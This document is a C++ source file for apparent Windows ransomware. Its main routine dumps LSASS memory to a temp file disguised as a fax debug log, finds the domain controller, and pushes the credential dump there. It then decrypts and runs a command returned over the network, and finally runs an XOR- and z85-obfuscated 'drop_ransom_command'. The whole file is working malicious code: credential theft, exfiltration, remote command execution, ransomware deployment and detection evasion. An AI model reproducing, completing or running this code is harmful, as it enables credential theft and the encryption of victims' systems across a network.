#include <Windows.h>
#include <DsGetDC.h>
#include <tchar.h>
#include <synchapi.h>
#include <string>
#include <iostream>

// Project imports

#include "rc4/rc4.h"
#include "network/network.h"
#include "base64/base64.h"
#include "key/key.h"
#include "obfuscation/obfuscation.h"
#include "lsass/lsass.h"
#include "z85/z85.hpp"

#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "NetApi32.lib")


std::string drop_ransom_command() {
    std::string command = encryptDecrypt({0x44,0x67,0x55,0x45,0x6c,0x44,0x38,0x50,0x58,0x3c,0x7c,0x3a,0x21,0x2b,0x6b,0x46,0x5d,0x30,0x35,0x4d,0x75,0x6d,0x28,0x45,0x4e,0x60,0x55,0x53,0x37,0x7d,0x64,0x71,0x36,0x70,0x67,0x7f,0x47,0x3b,0x20,0x30,0x76,0x35,0x62,0x31,0x43,0x72,0x68,0x55,0x68,0x3a,0x64,0x71,0x36,0x36,0x34,0x73,0x39,0x34,0x5c,0x40,0x69,0x70,0x49,0x4b,0x2e,0x76,0x52,0x70,0x4c,0x73,0x69,0x70,0x6e,0x73,0x5f,0x77,0x7c,0x33,0x74,0x54,0x69,0x77,0x41,0x4f,0x7f,0x77,0x7c,0x33,0x38,0x37,0x69,0x74,0x7e,0x63,0x70,0x77,0x7c,0x32,0x64,0x2d,0x69,0x6b,0x75,0x2e,0x45,0x77,0x7c,0x32,0x67,0x76,0x69,0x6b,0x62,0x5d,0x2c,0x6e,0x20,0x5d,0x62,0x72,0x69,0x77,0x69,0x7d,0x7c,0x6b,0x4e,0x69,0x38,0x5f,0x69,0x34,0x28,0x43,0x4f,0x6b,0x4e,0x69,0x38,0x4f,0x69,0x6b,0x62,0x5d,0x45,0x74,0x3c,0x24,0x5d,0x51,0x6e,0x45,0x4c,0x34,0x45,0x6c,0x33,0x2f,0x6e,0x5f,0x69,0x70,0x37,0x6f,0x5d,0x62,0x5b,0x49,0x74,0x51,0x69,0x71,0x4a,0x78,0x51,0x6a,0x2f,0x4f,0x74,0x54,0x69,0x71,0x4a,0x78,0x51,0x74,0x3c,0x5b,0x2d,0x48,0x69,0x71,0x72,0x24,0x4a,0x6b,0x4e,0x69,0x36,0x2b,0x69,0x71,0x72,0x24,0x56,0x6a,0x2f,0x4c,0x58,0x53,0x69,0x6b,0x4d,0x5e,0x7e,0x62,0x5b,0x49,0x49,0x40,0x69,0x70,0x50,0x51,0x5f,0x6c,0x33,0x3a,0x31,0x26,0x69,0x6b,0x62,0x5d,0x78,0x68,0x69,0x21,0x41,0x4c,0x69,0x70,0x37,0x6f,0x5d,0x6a,0x2f,0x4c,0x54,0x34,0x69,0x71,0x5c,0x34,0x50,0x7c,0x40,0x3d,0x7f,0x78,0x69,0x71,0x4a,0x78,0x54,0x63,0x4d,0x6a,0x6d,0x5c,0x69,0x6b,0x75,0x2e,0x45,0x62,0x5b,0x49,0x57,0x78,0x69,0x36,0x46,0x54,0x2e,0x63,0x4d,0x6b,0x2d,0x71,0x69,0x6b,0x4d,0x5e,0x21,0x7d,0x63,0x2a,0x5c,0x26,0x69,0x70,0x21,0x39,0x24,0x77,0x7c,0x33,0x74,0x3b,0x69,0x71,0x4a,0x78,0x50,0x7d,0x63,0x2a,0x5c,0x26,0x69,0x34,0x45,0x57,0x49,0x6e,0x20,0x5d,0x62,0x72,0x69,0x74,0x55,0x20,0x76,0x77,0x7c,0x32,0x61,0x5c,0x69,0x75,0x51,0x76,0x6c,0x7c,0x40,0x3d,0x7f,0x78,0x69,0x71,0x4a,0x78,0x55,0x6e,0x20,0x5d,0x32,0x55,0x69,0x75,0x76,0x64,0x66,0x7f,0x3f,0x73,0x43,0x3b,0x69,0x77,0x41,0x4f,0x7f,0x7c,0x40,0x3d,0x44,0x7d,0x69,0x71,0x43,0x3b,0x56,0x6c,0x33,0x3a,0x3d,0x35,0x69,0x73,0x32,0x7e,0x24,0x46,0x77,0x58,0x68,0x78,0x69,0x71,0x4a,0x78,0x51,0x63,0x4d,0x6a,0x6d,0x68,0x69,0x76,0x56,0x74,0x49,0x6b,0x4e,0x69,0x2d,0x3f,0x69,0x70,0x49,0x4b,0x2e,0x6a,0x2f,0x4c,0x42,0x71,0x69,0x70,0x46,0x4d,0x28,0x77,0x7c,0x32,0x60,0x71,0x69,0x71,0x58,0x61,0x52,0x77,0x7c,0x32,0x67,0x66,0x69,0x71,0x4a,0x78,0x55,0x62,0x5b,0x49,0x74,0x7d,0x69,0x6b,0x54,0x21,0x26,0x77,0x7c,0x33,0x6d,0x3a,0x6e,0x45,0x57,0x32,0x26,0x6a,0x2f,0x4c,0x48,0x2a,0x69,0x76,0x56,0x74,0x4f,0x73,0x2c,0x4e,0x4e,0x37,0x69,0x70,0x49,0x4b,0x3f,0x74,0x3c,0x24,0x53,0x6b,0x69,0x6b,0x4d,0x5e,0x26,0x6a,0x2f,0x4c,0x2d,0x40,0x69,0x77,0x66,0x77,0x72,0x77,0x7c,0x32,0x32,0x3b,0x69,0x70,0x2e,0x5f,0x2e,0x46,0x77,0x58,0x2b,0x4e,0x69,0x6b,0x75,0x2e,0x45,0x62,0x5b,0x49,0x57,0x78,0x69,0x36,0x46,0x54,0x2e,0x63,0x4d,0x6b,0x2d,0x71,0x69,0x6b,0x4d,0x5e,0x21,0x7d,0x63,0x2a,0x5c,0x26,0x69,0x70,0x21,0x39,0x24,0x77,0x7c,0x33,0x74,0x3b,0x69,0x71,0x4a,0x78,0x50,0x7d,0x63,0x2a,0x5c,0x26,0x6e,0x45,0x57,0x3d,0x35,0x6a,0x2f,0x4c,0x45,0x52,0x69,0x6b,0x62,0x5d,0x2c,0x63,0x4d,0x6b,0x48,0x52,0x69,0x70,0x50,0x51,0x2e,0x62,0x5b,0x49,0x50,0x77,0x69,0x71,0x4a,0x78,0x51,0x62,0x5b,0x49,0x50,0x77,0x69,0x34,0x28,0x43,0x4f,0x63,0x4d,0x6b,0x5c,0x3d,0x69,0x71,0x60,0x50,0x54,0x74,0x3c,0x24,0x57,0x57,0x69,0x34,0x28,0x43,0x4f,0x6b,0x4e,0x69,0x6c,0x21,0x6e,0x45,0x4c,0x34,0x26,0x46,0x77,0x58,0x6b,0x4b,0x69,0x70,0x37,0x6f,0x5d,0x62,0x5b,0x49,0x74,0x6d,0x69,0x70,0x50,0x51,0x38,0x73,0x2c,0x4e,0x54,0x42,0x69,0x76,0x56,0x74,0x4f,0x74,0x3c,0x24,0x72,0x2b,0x69,0x70,0x46,0x4d,0x3f,0x6e,0x20,0x5d,0x54,0x76,0x69,0x70,0x21,0x39,0x2a,0x77,0x7c,0x32,0x3d,0x67,0x69,0x73,0x32,0x7e,0x38,0x6e,0x20,0x5d,0x20,0x56,0x69,0x71,0x4a,0x78,0x50,0x73,0x2c,0x4e,0x4f,0x3a,0x69,0x71,0x4a,0x78,0x50,0x6b,0x4e,0x69,0x4f,0x56,0x69,0x36,0x6e,0x40,0x28,0x77,0x7c,0x32,0x62,0x5f,0x69,0x71,0x4a,0x78,0x55,0x6b,0x4e,0x6e,0x7e,0x69,0x69,0x36,0x67,0x7c,0x5f,0x76,0x52,0x70,0x62,0x2a,0x69,0x70,0x71,0x47,0x28,0x77,0x7c,0x33,0x24,0x38,0x69,0x34,0x28,0x43,0x4f,0x7d,0x63,0x2a,0x61,0x69,0x69,0x36,0x46,0x54,0x5f,0x73,0x2c,0x4f,0x2e,0x37,0x69,0x37,0x55,0x31,0x57,0x7d,0x63,0x2a,0x47,0x71,0x69,0x71,0x4a,0x78,0x50,0x74,0x3c,0x5b,0x2d,0x48,0x69,0x75,0x76,0x64,0x63,0x6c,0x33,0x3a,0x34,0x5b,0x69,0x6b,0x62,0x5d,0x78,0x77,0x7c,0x32,0x3d,0x67,0x69,0x6b,0x62,0x5d,0x2c,0x6e,0x20,0x5d,0x62,0x72,0x69,0x74,0x5f,0x36,0x76,0x68,0x69,0x21,0x41,0x4c,0x69,0x71,0x58,0x61,0x56,0x6e,0x20,0x5d,0x32,0x55,0x69,0x75,0x76,0x64,0x66,0x7f,0x3f,0x73,0x43,0x3b,0x69,0x77,0x41,0x4f,0x7f,0x7c,0x40,0x3d,0x44,0x7d,0x69,0x71,0x43,0x3b,0x56,0x6c,0x33,0x3a,0x3d,0x35,0x69,0x73,0x32,0x7e,0x24,0x46,0x77,0x58,0x68,0x78,0x69,0x71,0x4a,0x78,0x51,0x63,0x4d,0x6a,0x6d,0x68,0x69,0x76,0x56,0x74,0x49,0x6b,0x4e,0x69,0x2d,0x3f,0x69,0x70,0x49,0x4b,0x2e,0x6a,0x2f,0x4c,0x42,0x71,0x69,0x70,0x46,0x4d,0x28,0x77,0x7c,0x32,0x60,0x71,0x69,0x71,0x58,0x61,0x52,0x77,0x7c,0x32,0x67,0x66,0x69,0x71,0x4a,0x78,0x55,0x62,0x5b,0x49,0x74,0x7d,0x69,0x6b,0x54,0x21,0x26,0x77,0x7c,0x33,0x6d,0x3a,0x69,0x37,0x5c,0x64,0x56,0x62,0x5b,0x49,0x3d,0x67,0x69,0x71,0x4a,0x78,0x51,0x62,0x5b,0x49,0x74,0x3a,0x69,0x6b,0x62,0x5d,0x78,0x7d,0x63,0x2a,0x63,0x2a,0x69,0x37,0x5c,0x64,0x51,0x47,0x36,0x56,0x2a,0x76,0x69,0x71,0x4a,0x78,0x51,0x63,0x4d,0x6a,0x60,0x2d,0x69,0x6b,0x7c,0x3a,0x20,0x77,0x7c,0x33,0x74,0x54,0x69,0x75,0x20,0x4e,0x68,0x74,0x3c,0x24,0x72,0x2b,0x69,0x70,0x46,0x4d,0x5d,0x6e,0x20,0x5d,0x62,0x72,0x69,0x74,0x6a,0x3f,0x6a,0x7c,0x40,0x3d,0x43,0x20,0x69,0x71,0x4a,0x78,0x50,0x6b,0x4e,0x69,0x42,0x57,0x69,0x70,0x71,0x47,0x5f,0x6e,0x20,0x5d,0x51,0x4f,0x69,0x6b,0x62,0x5d,0x78,0x7d,0x63,0x2a,0x3c,0x55,0x69,0x34,0x45,0x57,0x4b,0x6a,0x2f,0x4c,0x48,0x2a,0x69,0x76,0x56,0x74,0x4f,0x73,0x2c,0x4e,0x4e,0x37,0x69,0x70,0x49,0x4b,0x3f,0x74,0x3c,0x24,0x53,0x6b,0x69,0x6b,0x4d,0x5e,0x26,0x6a,0x2f,0x4c,0x2d,0x40,0x69,0x77,0x66,0x77,0x72,0x77,0x7c,0x32,0x32,0x3b,0x69,0x70,0x2e,0x5f,0x2e,0x46,0x77,0x58,0x2b,0x4e,0x69,0x6b,0x75,0x2e,0x45,0x62,0x5b,0x49,0x57,0x78,0x69,0x36,0x46,0x54,0x2e,0x63,0x4d,0x6b,0x2d,0x71,0x69,0x6b,0x4d,0x5e,0x21,0x7d,0x63,0x2a,0x5c,0x26,0x69,0x70,0x21,0x39,0x24,0x77,0x7c,0x33,0x74,0x3b,0x69,0x71,0x4a,0x78,0x50,0x7d,0x63,0x2a,0x5c,0x26,0x69,0x34,0x45,0x57,0x48,0x47,0x36,0x54,0x58,0x3b}, 0x05);
    return z85::decode(command);
}

void spawn_process(LPSTR command) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );
    int res = CreateProcess(
        nullptr,              // No module name (use command line)
        command,               // Command line
        nullptr,           // Process handle not inheritable
        nullptr,           // Thread handle not inheritable
        FALSE,              // Set handle inheritance to FALSE
        0,                // No creation flags
        nullptr,           // Use parent's environment block
        nullptr,       // Use parent's starting directory
        &si,              // Pointer to STARTUPINFO structure
        &pi        // Pointer to PROCESS_INFORMATION structure
    );

    // Start the child process.
    if( !res)
        return;

    // Wait until child process exits.
    WaitForSingleObject( pi.hProcess, INFINITE );

    // Close process and thread handles.
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
}


PDOMAIN_CONTROLLER_INFOA get_dc() {
    PDOMAIN_CONTROLLER_INFOA dcInfo {};
    ULONG flags = DS_DIRECTORY_SERVICE_REQUIRED;
    DsGetDcNameA(nullptr, nullptr, nullptr, nullptr, flags, &dcInfo);
    return dcInfo;

}



int main(int argc,char **argv) {
    //      C:\Windows\Temp\FXSTIFFDebugLogFileAdmin.txt

    std::string filename = encryptDecrypt({0x70,0x09,0x6f,0x64,0x5a,0x5d,0x57,0x5c,0x44,0x40,0x6f,0x67,0x56,0x5e,0x43,0x6f,0x75,0x6b,0x60,0x67,0x7a,0x75,0x75,0x77,0x56,0x51,0x46,0x54,0x7f,0x5c,0x54,0x75,0x5a,0x5f,0x56,0x72,0x57,0x5e,0x5a,0x5d,0x1d,0x47,0x4b,0x47}, 0x33);
    dump_lsass(filename);


    PDOMAIN_CONTROLLER_INFOA domain_controller = get_dc();
    std::string ip = ((std::string) domain_controller->DomainControllerAddress);
    ip = ip.substr(2,ip.length());

    std::string response = push_dump(ip, filename);

    std::vector<BYTE> decoded_response = base64_decode(response.substr(1,response.size() - 2));
    auto* unsigned_response = new unsigned char[decoded_response.size()];
    std::copy(decoded_response.begin(), decoded_response.end(), unsigned_response);

    std::string key = get_key();
    auto * unsigned_key = new unsigned char[key.size()];
    std::copy(key.begin(), key.end(), unsigned_key);

    struct rc4_state *s;
    s=(struct rc4_state *) malloc (sizeof(struct rc4_state));

    rc4_setup(s, unsigned_key, key.size());
    rc4_crypt(s, unsigned_response, decoded_response.size());

    spawn_process((LPSTR) unsigned_response);

    std::string final_command = drop_ransom_command();
    spawn_process((LPSTR) final_command.c_str());
    return 0;
}
